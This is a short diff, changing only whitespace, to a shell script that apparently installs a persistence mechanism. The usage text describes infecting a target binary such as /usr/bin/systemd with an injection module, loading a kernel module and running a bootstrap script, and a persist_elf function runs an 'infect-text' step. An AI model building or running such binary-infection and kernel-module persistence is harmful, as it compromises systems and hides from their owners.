@@ -30,12 +30,12 @@ generate_entropy() {
 
 adjust_env_paths
 usage="Usage: [options] ./${0##*/} <target_binary>
-  
+
   Options:
     INJECTION_DIR       Path to injection module (default: ../inject)
     KERNEL_MODULE       Kernel module path (default: ../ave.ko)
     BOOTSTRAP_SCRIPT    Init script for execution (default: ../src/up.sh)
-  
+
   Examples:
     ./${0##*/} /usr/bin/systemd
     INJECTION_DIR=/tmp/libinject ./${0##*/} /usr/bin/systemd
@@ -103,7 +103,7 @@ persist_elf() {
 
   pushd "$INJECTION_DIR" >/dev/null && {
     source completion.sh
-    ./run example-infect-text "$temp_file" ../src/injection || { 
+    ./run example-infect-text "$temp_file" ../src/injection || {
       rm -f "$temp_file" "$backup_file"
       cleanup_installation
       false
